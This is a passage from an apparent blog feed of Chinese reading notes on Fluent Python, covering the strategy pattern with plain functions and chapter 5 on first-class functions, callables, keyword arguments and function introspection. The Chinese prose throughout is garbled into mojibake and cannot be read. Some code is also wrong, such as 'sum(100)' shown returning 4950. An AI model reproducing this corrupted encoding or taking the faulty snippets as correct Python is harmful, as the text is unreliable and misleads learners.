Promotionæ˜¯æŠ½è±¡åŸºç±»(ABC)ï¼Œè¿™ä¹ˆåšæ˜¯ä¸ºäº†ä½¿ç”¨@abstractmethodè£…é¥°å™¨ï¼Œä»è€Œæ˜ç¡®è¡¨æ˜æ‰€ç”¨çš„æ¨¡å¼ã€‚ ä¸‹é¢æ˜¯ä½¿ç”¨ä¸åŒå‡ºå°æŠ˜æ‰£çš„Orderç±»ç¤ºä¾‹: 12345678910111213141516171819&gt;&gt;&gt; joe = Customer('John Doe', 0)&gt;&gt;&gt; ann = Customer('Ann Smith', 1100)&gt;&gt;&gt; cart = [LineItem('banana', 4, .5),... LineItem('apple', 10, 1.5),... LineItem('watermellon', 5, 5.0)]&gt;&gt;&gt; Order(joe, cart, FidelityPromo())&lt;Order total: 42.00 due: 42.00&gt;&gt;&gt;&gt; Order(ann, cart, FidelityPromo())&lt;Order total: 42.00 due: 39.90&gt;&gt;&gt;&gt; banana_cart = [LineItem('banana', 30, .5),... LineItem('apple', 10, 1.5)]&gt;&gt;&gt; Order(joe, banana_cart, BulkItemPromo())&lt;Order total: 30.00 due: 28.50&gt;&gt;&gt;&gt; long_order = [LineItem(str(item_code), 1, 1.0)... for item_code in range(10)]&gt;&gt;&gt; Order(joe, long_order, LargeOrderPromo())&lt;Order total: 10.00 due: 9.30&gt;&gt;&gt;&gt; Order(joe, cart, LargeOrderPromo())&lt;Order total: 42.00 due: 42.00&gt; ä½¿ç”¨å‡½æ•°å®ç°ç­–ç•¥æ¨¡å¼ä¸Šé¢çš„ç»å…¸å®ç°ä¸­ï¼Œæ¯ä¸ªç­–ç•¥æ˜¯ä¸€ä¸ªç±»ï¼Œè€Œä¸”éƒ½åªå®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•discount, æ­¤å¤–å®ƒä»¬éƒ½æ²¡æœ‰å®ä¾‹å±æ€§ï¼Œå› æ­¤å¯ä»¥ç”¨æ™®é€šå‡½æ•°æ›¿æ¢ã€‚ä¸‹é¢æ˜¯ä½¿ç”¨å‡½æ•°çš„ä¸€ç§å®ç°ã€‚ç¤ºä¾‹6.3 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding:utf-8from collections import namedtupleCustomer = namedtuple('Customer', 'name fidelity')class LineItem: def __init__(self, product, quantity, price): self.product = product self.quantity = quantity self.price = price def total(self): return self.price * self.quantityclass Order: # ä¸Šä¸‹æ–‡ def __init__(self, customer, cart, promotion=None): self.customer = customer self.cart = list(cart) self.promotion = promotion def total(self): if not hasattr(self, '__total'): self.__total = sum(item.total() for item in self.cart) return self.__total def due(self): if self.promotion is None: discount = 0 else: discount = self.promotion(self) return self.total() - discount def __repr__(self): fmt = '&lt;Order total: &#123;:.2f&#125; due: &#123;:.2f&#125;&gt;' return fmt.format(self.total(), self.due())def fidelity_promo(order): """ä¸ºç§¯åˆ†ä¸º1000æˆ–ä»¥ä¸Šçš„é¡¾å®¢æä¾›5%æŠ˜æ‰£""" return order.total() * .05 if order.customer.fidelity &gt;= 1000 else 0def bulk_item_promo(order): """å•ä¸ªå•†å“ä¸º20ä¸ªæˆ–ä»¥ä¸Šæ—¶æä¾›10%æŠ˜æ‰£""" discount = 0 for item in order.cart: if item.quantity &gt;= 20: discount += item.total() * .1 return discountdef large_order_promo(order): """è®¢å•ä¸­çš„ä¸åŒå•†å“è¾¾åˆ°10ä¸ªæˆ–ä»¥ä¸Šæ—¶æä¾›7%æŠ˜æ‰£""" distinct_items = &#123;item.product for item in order.cart&#125; if len(distinct_items) &gt;= 10: return order.total() * .07 return 0 è¿™ä¸ªå®ä¾‹ä¸­æ²¡æœ‰æŠ½è±¡ç±»ï¼Œè€Œä¸”å„ä¸ªç­–ç•¥éƒ½æ˜¯å‡½æ•°ã€‚ä¸‹é¢æ˜¯å®é™…ä½¿ç”¨çš„è¾“å‡º: 12345678910111213141516171819&gt;&gt;&gt; joe = Customer('John Doe', 0)&gt;&gt;&gt; ann = Customer('Ann Smith', 1100)&gt;&gt;&gt; cart = [LineItem('banana', 4, .5),... LineItem('apple', 10, 1.5),... LineItem('watermellon', 5, 5.0)]&gt;&gt;&gt; Order(joe, cart, fidelity_promo)&lt;Order total: 42.00 due: 42.00&gt;&gt;&gt;&gt; Order(ann, cart, fidelity_promo)&lt;Order total: 42.00 due: 39.90&gt;&gt;&gt;&gt; banana_cart = [LineItem('banana', 30, .5),... LineItem('apple', 10, 1.5)]&gt;&gt;&gt; Order(joe, banana_cart, bulk_item_promo)&lt;Order total: 30.00 due: 28.50&gt;&gt;&gt;&gt; long_order = [LineItem(str(item_code), 1, 1.0)... for item_code in range(10)]&gt;&gt;&gt; Order(joe, long_order, large_order_promo)&lt;Order total: 10.00 due: 9.30&gt;&gt;&gt;&gt; Order(joe, cart, large_order_promo)&lt;Order total: 42.00 due: 42.00&gt; å¯ä»¥çœ‹åˆ°åº”ç”¨å¯¹åº”çš„è¯¦ç»†ç­–ç•¥åªéœ€è¦å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥Orderç±»ï¼Œæ²¡å¿…è¦åƒ6.1ä¸€æ ·å®ä¾‹åŒ–ç­–ç•¥å¯¹è±¡ï¼Œè¿™æ ·ä¼šä½¿å¾—èµ„æºæœ‰æ‰€èŠ‚çœã€‚ ã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹ä¸€ä¹¦çš„ä½œè€…æŒ‡å‡ºï¼šâ€œç­–ç•¥å¯¹è±¡é€šå¸¸æ˜¯å¾ˆå¥½çš„äº«å…ƒï¼ˆflyweightï¼‰ã€‚â€ é‚£æœ¬ä¹¦çš„å¦ä¸€éƒ¨åˆ†å¯¹â€œäº«å…ƒâ€ä¸‹äº†å®šä¹‰ï¼šâ€œäº«å…ƒæ˜¯å¯å…±äº«çš„å¯¹è±¡ï¼Œå¯ä»¥åŒæ—¶åœ¨å¤šä¸ªä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ã€‚â€ å…±äº«æ˜¯æ¨èçš„åšæ³•ï¼Œè¿™æ ·ä¸å¿…åœ¨æ¯ä¸ªæ–°çš„ä¸Šä¸‹æ–‡ï¼ˆè¿™é‡Œæ˜¯ Order å®ä¾‹ï¼‰ä¸­ä½¿ç”¨ç›¸åŒçš„ç­–ç•¥æ—¶ä¸æ–­æ–°å»ºå…·ä½“ç­–ç•¥å¯¹è±¡ï¼Œä»è€Œå‡å°‘æ¶ˆè€—ã€‚å› æ­¤ï¼Œä¸ºäº†é¿å…â€œç­–ç•¥â€æ¨¡å¼çš„ä¸€ä¸ªç¼ºç‚¹ï¼ˆè¿è¡Œæ—¶æ¶ˆè€—ï¼‰ï¼Œã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹çš„ä½œè€…å»ºè®®å†ä½¿ç”¨å¦ä¸€ä¸ªæ¨¡å¼ã€‚ä½†æ­¤æ—¶ï¼Œä»£ç è¡Œæ•°å’Œç»´æŠ¤æˆæœ¬ä¼šä¸æ–­æ”€å‡ã€‚ åœ¨å¤æ‚çš„æƒ…å†µä¸‹ï¼Œéœ€è¦å…·ä½“ç­–ç•¥ç»´æŠ¤å†…éƒ¨çŠ¶æ€æ—¶ï¼Œå¯èƒ½éœ€è¦æŠŠâ€œç­–ç•¥â€å’Œâ€œäº«å…ƒâ€æ¨¡å¼ç»“åˆèµ·æ¥ã€‚ä½†æ˜¯ï¼Œå…·ä½“ç­–ç•¥ä¸€èˆ¬æ²¡æœ‰å†…éƒ¨çŠ¶æ€ï¼Œåªæ˜¯å¤„ç†ä¸Šä¸‹æ–‡ä¸­çš„æ•°æ®ã€‚æ­¤æ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨æ™®é€šçš„å‡½æ•°ï¼Œåˆ«å»ç¼–å†™åªæœ‰ä¸€ä¸ªæ–¹æ³•çš„ç±»ï¼Œå†å»å®ç°å¦ä¸€ä¸ªç±»å£°æ˜çš„å•å‡½æ•°æ¥å£ã€‚å‡½æ•°æ¯”ç”¨æˆ·å®šä¹‰çš„ç±»çš„å®ä¾‹è½»é‡ï¼Œè€Œä¸”æ— éœ€ä½¿ç”¨â€œäº«å…ƒâ€æ¨¡å¼ï¼Œå› ä¸ºå„ä¸ªç­–ç•¥å‡½æ•°åœ¨ Python ç¼–è¯‘æ¨¡å—æ—¶åªä¼šåˆ›å»ºä¸€æ¬¡ã€‚æ™®é€šçš„å‡½æ•°ä¹Ÿæ˜¯â€œå¯å…±äº«çš„å¯¹è±¡ï¼Œå¯ä»¥åŒæ—¶åœ¨å¤šä¸ªä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨â€ è‡³æ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨å‡½æ•°å®ç°äº†â€œç­–ç•¥â€æ¨¡å¼ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¼šåœ¨æ­¤åŸºç¡€ä¸Šè®²å¦‚ä½•åˆ©ç”¨ä¸€è‡´çš„æ¡ä»¶é€‰æ‹©æœ€ä½³çš„ç­–ç•¥ã€‚ é€‰æ‹©æœ€ä½³ç­–ç•¥çš„ç®€å•æ–¹æ³•(æš´åŠ›è¿­ä»£)ä½¿ç”¨æš´åŠ›è¿­ä»£çš„è¯ï¼Œè¿™ä¸ªæœ€ä½³ç­–ç•¥é€‰æ‹©çš„å®ç°å¼‚å¸¸ç®€å•: 1234promos = [fidelity_promo, bulk_item_promo, large_order_promo]def best_promo(order): """é€‰æ‹©å¯ç”¨çš„æœ€ä½³æŠ˜æ‰£""" return max(promo(order) for promo in promos) è¿™æ ·ç›´æ¥å°†best_promoä½œä¸ºå‚æ•°ä¼ å…¥Orderç±»å°±è¡Œã€‚ä¸è¿‡è¿™æ ·åšçš„ç¼ºé™·æ˜¯:æ·»åŠ æ–°çš„ç­–ç•¥è¦å®šä¹‰æ–°çš„å‡½æ•°ï¼Œå¹¶åŠ è¿›promosåˆ—è¡¨ï¼Œå¦åˆ™ä¸åœ¨best_promoçš„é€‰æ‹©èŒƒå›´å†…ã€‚ æ‰¾å‡ºæ¨¡å—ä¸­çš„å…¨éƒ¨ç­–ç•¥æ—¢ç„¶è¯´åˆ°å¯¹æ¨¡å—ä¸­å‡½æ•°çš„éå†ï¼Œå°±ä¸å¾—ä¸æåˆ°æ¨¡å—çš„å†…çœå‡½æ•°globals(),è¿™æ ·ä¸€è¯´æˆ‘ä»¬å°±çŸ¥é“ï¼Œæ¨¡å—ä¹Ÿæ˜¯ä¸€ç­‰å¯¹è±¡ï¼ˆã€‚ã€‚ã€‚ã€‚ è¿™æ ·æˆ‘ä»¬æœ‰äº†æ–°çš„best_promo: 123456promos = [globals()[name] for name in globals() if name.endswith('_promo') and name != 'best_promo']def best_promo(order):"""é€‰æ‹©å¯ç”¨çš„æœ€ä½³æŠ˜æ‰£""" return max(promo(order) for promo in promos) å¦ä¸€ç§æ–¹æ³•æ˜¯ï¼Œåœ¨ä¸€ä¸ªå•ç‹¬çš„æ¨¡å—(promotions.py)ä¸­ä¿å­˜æ‰€æœ‰ç­–ç•¥å‡½æ•°ï¼ŒæŠŠbest_promoæ’é™¤åœ¨å¤–ã€‚ 12345promos = [func for name, func in inspect.getmembers(promotions, inspect.isfunction)]def best_promo(order): """é€‰æ‹©å¯ç”¨çš„æœ€ä½³æŠ˜æ‰£""" return max(promo(order) for promo in promos) è¿™ä¸ªå®ç°çš„ç¼ºé™·æ˜¯ï¼Œpromotionsæ¨¡å—ä¸­çš„æ‰€æœ‰å‡½æ•°å¿…é¡»æ˜¯ç­–ç•¥å‡½æ•°ï¼Œè¿™ç§å®ç°æ˜¯å¼ºè°ƒæ¨¡å—å†…çœçš„ä¸€ç§ç”¨é€”è€Œä¸æ˜¯æä¾›å®Œå–„çš„æ–¹æ¡ˆã€‚ æ€»ç»“ä½¿ç”¨ä¸€ç­‰å¯¹è±¡å®ç°ç­–ç•¥æ¨¡å¼çš„æ ¸å¿ƒæ€æƒ³æ˜¯: ç”¨â€ä½¿ç”¨æ™®é€šçš„å‡½æ•°â€çš„æ–¹å¼ä»£æ›¿â€ç¼–å†™åªæœ‰ä¸€ä¸ªæ–¹æ³•çš„ç±»ï¼Œå†å»å®ç°å¦ä¸€ä¸ªç±»å£°æ˜çš„å•å‡½æ•°æ¥å£â€ã€‚å°†æ™®é€šçš„å‡½æ•°ä½œä¸ºå¯å…±äº«çš„å¯¹è±¡ã€‚ ä¸Šé¢çš„ä¾‹å­éƒ½æ˜¯åŸºäºè¿™ä¸€æ€æƒ³è¿›è¡Œä¼˜åŒ–ï¼Œå¹¶ä¸”å¤„ä½¿ç”¨ä¸€ç­‰å¯¹è±¡çš„ç‰¹æ€§(å‡½æ•°ä½œä¸ºå‚æ•°ã€æ¨¡å—å†…çœ)ã€‚ ä¸‹ä¸€ç¯‡æˆ‘ä»¬ä¼šè®²åˆ°å‘½ä»¤æ¨¡å¼ï¼Œå…³äºç­–ç•¥æ¨¡å¼å’Œå‘½ä»¤æ¨¡å¼çš„å®šä¹‰å’Œåœºæ™¯ï¼Œå‚è§ï¼šå…³äºè®¾è®¡æ¨¡å¼ï¼šç­–ç•¥æ¨¡å¼å’Œå‘½ä»¤æ¨¡å¼ ï¼ˆä»Šå¤©å¥½é«˜äº§]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>design pattern</tag>
        <tag>The Strategy pattern</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python ç¬¬äº”ç« å°è®°]]></title>
    <url>%2F2017%2F12%2F13%2Ffluent-python-5%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬äº”ç« è¯»ä¹¦æŠ¥å‘Š Chapter 5. First Class Functionsç¬¬äº”ç« . ä¸€ç­‰å‡½æ•°é¦–å…ˆè§£é‡Šä¸€ä¸‹æ ‡é¢˜çš„å«ä¹‰:ç¼–ç¨‹è¯­è¨€ç†è®ºå®¶æŠŠâ€œä¸€ç­‰å¯¹è±¡â€å®šä¹‰ä¸ºæ»¡è¶³ä¸‹è¿°æ¡ä»¶çš„ç¨‹åºå®ä½“ï¼š åœ¨è¿è¡Œæ—¶åˆ›å»º èƒ½èµ‹å€¼ç»™å˜é‡æˆ–æ•°æ®ç»“æ„ä¸­çš„å…ƒç´  èƒ½ä½œä¸ºå‚æ•°ä¼ ç»™å‡½æ•° èƒ½ä½œä¸ºå‡½æ•°çš„è¿”å›ç»“æœ åœ¨Pythonä¸­ï¼Œæ•´æ•°ã€å­—ç¬¦ä¸²å’Œå­—å…¸éƒ½æ˜¯ä¸€ç­‰å¯¹è±¡ï¼Œç‰¹åˆ«æåˆ°çš„æ˜¯ï¼Œå‡½æ•°ä¹Ÿæ˜¯ä¸€ç­‰å¯¹è±¡ï¼Œè¿™ä¸€ç‰¹æ€§ç§°ä¸ºä¸€ç­‰å‡½æ•°ã€‚ æŠŠå‡½æ•°è§†ä½œå¯¹è±¡12345&gt;&gt;&gt; print.__doc__"print(value, ..., sep=' ', end='\\n', file=sys.stdout, flush=False)\n\nPrints the values to a stream, or to sys.stdout by default.\nOptional keyword arguments:\nfile: a file-like object (stream); defaults to the current sys.stdout.\nsep: string inserted between values, default a space.\nend: string appended after the last value, default a newline.\nflush: whether to forcibly flush the stream."&gt;&gt;&gt; type(print)&lt;class 'builtin_function_or_method'&gt; ç”±ä¸Šé¢çš„æ§åˆ¶å°è¾“å‡ºå¯ä»¥çœ‹åˆ°å‡½æ•°printæœ‰ä¸€ä¸ªåä¸º__doc__çš„å±æ€§, åŒæ—¶æ˜¯builtin_function_or_methodçš„ä¸€ä¸ªå®ä¾‹ã€‚ 12345678&gt;&gt; def plus(a):... return a+1...&gt;&gt;&gt; map(plus, range(10))&lt;map object at 0x109553c50&gt;&gt;&gt;&gt; list(map(plus, range(10)))[1, 2, 3, 4, 5, 6, 7, 8, 9, 10] ç”±ä¸Šé¢çš„æ§åˆ¶å°è¾“å‡ºå¯ä»¥çœ‹åˆ°å‡½æ•°æ˜¯å¯ä»¥ä½œä¸ºå‚æ•°è¢«ä¼ é€’çš„ã€‚æœ‰äº†ä¸€ç­‰å‡½æ•°ï¼Œå°±å¯ä»¥ä½¿ç”¨å‡½æ•°å¼ç¼–ç¨‹ã€‚ é«˜é˜¶å‡½æ•°æ¥å—å‡½æ•°ä¸ºå‚æ•°ï¼Œæˆ–è€…æŠŠå‡½æ•°ä½œä¸ºç»“æœè¿”å›çš„å‡½æ•°æ˜¯é«˜é˜¶å‡½æ•°ï¼ˆhigher-orderfunctionï¼‰ï¼Œç¬¬ä¸€èŠ‚ä¸­æåˆ°çš„mapå°±æ˜¯ä¸€ä¸ªé«˜é˜¶å‡½æ•°ã€‚ å¸¸è§çš„é«˜é˜¶å‡½æ•°å‡½æ•°å¼è¯­è¨€é€šå¸¸ä¼šæä¾›mapã€filterå’Œreduceè¿™ä¸‰ä¸ªé«˜é˜¶å‡½æ•°ã€‚ åœ¨Pythonä¸­ï¼Œmap/filteræœ‰æ›´å¥½ç”¨çš„æ›¿ä»£å“ï¼ŒPython2ä¸­map/filterè¿”å›çš„æ˜¯åˆ—è¡¨ï¼Œæ‰€ä»¥æ¯”è¾ƒå¥½çš„æ›¿ä»£å“æ˜¯åˆ—è¡¨æ¨å¯¼ï¼ŒPython3ä¸­è¿™ä¸¤ä¸ªå‡½æ•°çš„è¿”å›åˆ™æ˜¯ç”Ÿæˆå™¨ï¼Œæ‰€ä»¥æ¯”è¾ƒå¥½çš„æ›¿ä»£æ˜¯ç”Ÿæˆå™¨è¡¨è¾¾å¼ reduceæ¯”è¾ƒç‰¹åˆ«ï¼š 1234567&gt;&gt;&gt; from functools import reduce &gt;&gt;&gt; from operator import add &gt;&gt;&gt; reduce(add, range(100)) 4950&gt;&gt;&gt; sum(100)4950 sum å’Œ reduce çš„é€šç”¨æ€æƒ³æ˜¯æŠŠæŸä¸ªæ“ä½œè¿ç»­åº”ç”¨åˆ°åºåˆ—çš„å…ƒç´ ä¸Šï¼Œç´¯è®¡ä¹‹å‰çš„ç»“æœï¼ŒæŠŠä¸€ç³»åˆ—å€¼å½’çº¦æˆä¸€ä¸ªå€¼ã€‚ç±»ä¼¼çš„å½’çº¦å‡½æ•°è¿˜æœ‰all()å’Œany(), all()ä¼ å…¥ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œè‹¥æ‰€æœ‰å…ƒç´ éƒ½ä¸ºTrue,è¿”å›True,å¦åˆ™è¿”å›False; è€Œany()åªè¦æœ‰ä¸€ä¸ªTrueå°±è¿”å›Trueã€‚ åŒ¿åå‡½æ•°ä¸ºäº†ä½¿ç”¨é«˜é˜¶å‡½æ•°ï¼Œæœ‰æ—¶åˆ›å»ºä¸€æ¬¡æ€§çš„å°å‹å‡½æ•°æ›´ä¾¿åˆ©ï¼Œ è¿™ä¾¿æ˜¯åŒ¿åå‡½æ•°çš„ç”±æ¥ã€‚ lamdaå‡½æ•°å°±æ˜¯åœ¨pythonè¡¨è¾¾å¼å†…åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œä½†ç”±äºå¥æ³•çš„é™åˆ¶ï¼Œlambdaå‡½æ•°çš„å®šä¹‰ä½“åªèƒ½ç”¨çº¯è¡¨è¾¾å¼ã€‚ â€œFunctional Programming HOWTOâ€ ä¸­æåˆ°ï¼Œå¦‚æœä½¿ç”¨lambdaè¡¨è¾¾å¼ä½¿å¾—ä»£ç éš¾ä»¥ç†è§£ï¼Œå»ºè®®æŒ‰ä¸‹é¢çš„æ­¥éª¤é‡æ„: ç¼–å†™æ³¨é‡Šï¼Œè¯´æ˜lambdaè¡¨è¾¾å¼çš„ä½œç”¨ ç ”ç©¶æ³¨é‡Šï¼Œç”¨ä¸€ä¸ªåç§°æ¦‚æ‹¬ ç”¨è¿™ä¸ªåç§°å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠlambdaè¡¨è¾¾å¼è½¬æ¢æˆè¿™ä¸ªå‡½æ•° åˆ é™¤æ³¨é‡Š å¯è°ƒç”¨å¯¹è±¡Python çš„æ•°æ®æ¨¡å‹æ–‡æ¡£æŒ‡å‡ºäº†7ç§å¯è°ƒç”¨å¯¹è±¡ï¼š ç”¨æˆ·å®šä¹‰çš„å‡½æ•°: ä½¿ç”¨lambdaè¡¨è¾¾å¼æˆ–è€…defè¯­å¥åˆ›å»º å†…ç½®å‡½æ•°: ä½¿ç”¨CPythonå®ç°çš„å‡½æ•° å†…ç½®æ–¹æ³•: ä½¿ç”¨Cè¯­è¨€å®ç°çš„æ–¹æ³• æ–¹æ³•: ç±»çš„å®šä¹‰é¢˜ä¸­å®ç°çš„å‡½æ•° ç±»: è°ƒç”¨æ—¶ä¼šåˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œç„¶åæ‰§è¡Œæ„é€ å‡½æ•° ç±»çš„å®ä¾‹: å¦‚æœç±»å®šä¹‰äº†__call__æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒçš„å®ä¾‹å¯ä»¥ä½œä¸ºå‡½æ•°è°ƒç”¨ã€‚ ç”Ÿæˆå™¨å‡½æ•°: ä½¿ç”¨äº†yeildå…³é”®å­—çš„å‡½æ•°æˆ–æ–¹æ³•, è¿”å›ç”Ÿæˆå™¨å¯¹è±¡ã€‚ ç”¨æˆ·å®šä¹‰çš„å¯è°ƒç”¨ç±»å‹ä¸ä»…pythonå‡½æ•°å¼å¯¹è±¡ï¼Œå¯¹è±¡ä¹Ÿå¯ä»¥è¡¨ç°å¾—åƒå‡½æ•°ï¼Œåªéœ€è¦å®ç°æ–¹æ³•__call__ã€‚ 12345678910111213import randomclass BingoCage: def __init__(self, items): self._items = list(items) random.shuffle(self._items) def pick(self): try: return self._items.pop() except IndexError: raise LookupError('pick from empty BingoCage') def __call__(self): return self.pick() è¿™æ ·è°ƒç”¨BingoCageçš„å®ä¾‹æ—¶ï¼Œæ•ˆæœå’Œè°ƒç”¨pickæ–¹æ³•ä¸€æ ·ã€‚ å®ç° __call__ æ–¹æ³•çš„ç±»æ˜¯åˆ›å»ºå‡½æ•°ç±»å¯¹è±¡çš„ç®€ä¾¿æ–¹å¼ï¼Œæ­¤æ—¶å¿…é¡»åœ¨å†…éƒ¨ç»´æŠ¤ä¸€ä¸ªçŠ¶æ€ï¼Œè®©å®ƒåœ¨è°ƒç”¨ä¹‹é—´å¯ç”¨ï¼Œä¾‹å¦‚ BingoCage ä¸­çš„å‰©ä½™å…ƒç´ ã€‚è£…é¥°å™¨å°±æ˜¯è¿™æ ·ã€‚è£…é¥°å™¨å¿…é¡»æ˜¯å‡½æ•°ï¼Œè€Œä¸”æœ‰æ—¶è¦åœ¨å¤šæ¬¡è°ƒç”¨ä¹‹é—´â€œè®°ä½â€æŸäº›äº‹ [ ä¾‹å¦‚å¤‡å¿˜ï¼ˆmemoizationï¼‰ï¼Œå³ç¼“å­˜æ¶ˆè€—å¤§çš„è®¡ç®—ç»“æœï¼Œä¾›åé¢ä½¿ç”¨ ]ã€‚ åˆ›å»ºä¿æœ‰å†…éƒ¨çŠ¶æ€çš„å‡½æ•°ï¼Œè¿˜æœ‰ä¸€ç§æˆªç„¶ä¸åŒçš„æ–¹å¼ â€”â€” ä½¿ç”¨é—­åŒ…ã€‚ ä»å®šä½å‚æ•°åˆ°ä»…é™å…³é”®å­—å‚æ•°Pythonæä¾›äº†æä¸ºçµæ´»çš„å‚æ•°å¤„ç†æœºåˆ¶ï¼ŒPython3æä¾›äº† keyword-only argumentã€‚è°ƒç”¨å‡½æ•°æ—¶ä½¿ç”¨å’Œå±•å¼€å¯è¿­ä»£å¯¹è±¡ï¼Œæ˜ å°„åˆ°å•ä¸ªå‚æ•°ã€‚ ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œtagå‡½æ•°ç”¨äºç”Ÿæˆhtmlæ ‡ç­¾ 123456789101112131415def tag(name, *content, cls=None, **attrs): """ç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ªHTMLæ ‡ç­¾""" if cls is not None: attrs['class'] = cls if attrs: attr_str = ''.join(' %s="%s"' % (attr, value) for attr, value in sorted(attrs.items())) else: attr_str = '' if content: return '\n'.join('&lt;%s%s&gt;%s&lt;/%s&gt;' % (name, attr_str, c, name) for c in content) else: return '&lt;%s%s /&gt;' % (name, attr_str) ä¸‹é¢æ˜¯è¿™ä¸ªå‡½æ•°çš„å‡ ç§è°ƒç”¨æ–¹å¼ 12345678910111213141516171819&gt;&gt;&gt; tag('br')'&lt;br /&gt;'&gt;&gt;&gt; tag('p', 'hello')'&lt;p&gt;hello&lt;/p&gt;'&gt;&gt;&gt; print(tag('p', 'hello', 'world'))&lt;p&gt;hello&lt;/p&gt;&lt;p&gt;world&lt;/p&gt;&gt;&gt;&gt; tag('p', 'hello', id=33)'&lt;p id="33"&gt;hello&lt;/p&gt;'&gt;&gt;&gt; print(tag('p', 'hello', 'world', cls='sidebar'))&lt;p class="sidebar"&gt;hello&lt;/p&gt;&lt;p class="sidebar"&gt;world&lt;/p&gt;&gt;&gt;&gt; tag(content='testing', name="img")'&lt;img content="testing" /&gt;'&gt;&gt;&gt; my_tag = &#123;'name': 'img', 'title': 'Sunset Boulevard',... 'src': 'sunset.jpg', 'cls': 'framed'&#125;&gt;&gt;&gt; tag(**my_tag)'&lt;img class="framed" src="sunset.jpg" title="Sunset Boulevard" /&gt;' è·å–å…³äºå‚æ•°çš„ä¿¡æ¯è¿™é‡Œä¸¾ä¸€ä¸ªå¤„ç†webè¯·æ±‚çš„ä¾‹å­: 12345import bobo@bobo.query('/')def hello(person): return 'Hello %s!' % person åœ¨ä¸Šé¢è¿™æ®µä»£ç ä¸­ï¼Œboboæ˜¯ä¸€ä¸ªwebå¾®æ¡†æ¶ï¼Œbobo.query()è£…é¥°å™¨å°†hello()å‡½æ•°ä¸è¯·æ±‚å¤„ç†æœºåˆ¶ç»“åˆåœ¨ä¸€èµ·ï¼Œä½¿å¾—hello()è‡ªåŠ¨æ¥æ”¶è¯·æ±‚ä¸­çš„personä½œä¸ºå‚æ•°ï¼Œè‹¥æ²¡æœ‰personå‚æ•°ï¼Œåˆ™è¿”å›403. å‡½æ•°å¯¹è±¡æœ‰ä¸ª __defaults__ å±æ€§ï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œé‡Œé¢ä¿å­˜ç€å®šä½å‚æ•°å’Œå…³é”®å­—å‚æ•°çš„é»˜è®¤å€¼ã€‚ä»…é™å…³é”®å­—å‚æ•°çš„é»˜è®¤å€¼åœ¨ __kwdefaults__ å±æ€§ä¸­ã€‚ç„¶è€Œï¼Œå‚æ•°çš„åç§°åœ¨ __code__ å±æ€§ä¸­ï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ª code å¯¹è±¡å¼•ç”¨ï¼Œè‡ªèº«ä¹Ÿæœ‰å¾ˆå¤šå±æ€§ã€‚ ä¸‹é¢ä¸¾ä¸€ä¸ªclip.pyçš„ä¾‹å­ï¼Œè®²è§£å‡½æ•°å¯¹è±¡ç”¨äºè·å–å‚æ•°ä¿¡æ¯çš„å±æ€§ã€‚ 12345678910111213141516def clip(text, max_len=80): """åœ¨max_lenå‰é¢æˆ–åé¢çš„ç¬¬ä¸€ä¸ªç©ºæ ¼å¤„æˆªæ–­æ–‡æœ¬ """ end = None if len(text) &gt; max_len: space_before = text.rfind(' ', 0, max_len) if space_before &gt;= 0: end = space_before else: space_after = text.rfind(' ', max_len) if space_after &gt;= 0: end = space_after if end is None: # æ²¡æ‰¾åˆ°ç©ºæ ¼ end = len(text) return text[:end].rstrip() æˆ‘ä»¬åœ¨æ§åˆ¶å°è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼ŒæŸ¥çœ‹å±æ€§ 12345678910&gt;&gt;&gt; from clip import clip&gt;&gt;&gt; clip.__defaults__(80,)&gt;&gt;&gt; clip.__code__&lt;code object clip at 0x10dadcc90, file "/Users/NickAl/study/github/readings/Fluent-Python/5. First Class Functions/clip.py", line 2&gt;&gt;&gt;&gt; clip.__code__.co_varnames('text', 'max_len', 'end', 'space_before', 'space_after')&gt;&gt;&gt; clip.__code__.co_argcount2 å‚æ•°åç§°åœ¨ __code__.co_varnamesä¸­ï¼Œä¸è¿‡é‡Œé¢è¿˜æœ‰å‡½æ•°å®šä¹‰ä½“ä¸­åˆ›å»ºçš„å±€éƒ¨å˜é‡ã€‚å› æ­¤ï¼Œå‚æ•°åç§°æ˜¯å‰ N ä¸ªå­—ç¬¦ä¸²ï¼ŒNçš„å€¼ç”± __code\_.co_argcount ç¡®å®šã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œè¿™é‡Œä¸åŒ…å«å‰ç¼€ä¸º * æˆ– ** çš„é•¿åº¦å¯å˜çš„å‚æ•°ã€‚å‚æ•°çš„é»˜è®¤å€¼åªèƒ½é€šè¿‡å®ƒä»¬åœ¨ __defaults__ å…ƒç»„ä¸­çš„ä½ç½®ç¡®å®šï¼Œå› æ­¤è¦ä»åå‘å‰æ‰«ææ‰èƒ½æŠŠå‚æ•°å’Œé»˜è®¤å€¼å¯¹åº”èµ·æ¥ã€‚ å¦ä¸€ç§æŸ¥çœ‹å±æ€§çš„æ–¹å¼æ˜¯ï¼Œä½¿ç”¨inspect æ¨¡å— 12345678910&gt;&gt;&gt; from clip import clip&gt;&gt;&gt; from inspect import signature&gt;&gt;&gt; sig = signature(clip)&gt;&gt;&gt; sig&lt;Signature (text, max_len=80)&gt;&gt;&gt;&gt; for name, param in 